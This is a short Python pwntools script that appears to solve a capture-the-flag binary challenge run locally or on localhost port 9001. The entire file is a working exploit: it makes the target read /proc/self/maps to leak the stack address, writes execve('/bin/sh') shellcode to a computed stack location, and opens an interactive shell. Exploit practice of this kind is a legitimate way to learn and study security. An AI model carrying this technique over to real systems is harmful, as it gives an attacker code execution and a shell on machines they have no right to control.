from pwn import *

context.arch = "x86_64"


def conn():
    if args.LOCAL:
        p = process("../challenge/chall")
        return p
    elif args.REMOTE:
        HOST, PORT = "localhost", 9001
        p = remote(HOST, PORT)
        return p


def main():
    p = conn()
    memory_file = b"/proc/self/maps\x00"
    p.sendlineafter("name: ", memory_file)
    for i in range(36):
        p.recvline()

    stack_base = p.recvuntil(b"-", drop=True)
    stack_base = int(stack_base, 16)
    log.info(f"stack_addr : {hex(stack_base)}")
    p.sendlineafter("where: ", str(stack_base + 0x20))

    shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))

    payload = b""
    payload += shellcode

    p.sendlineafter("what: ", payload)
    p.interactive()


if __name__ == "__main__":

    main()
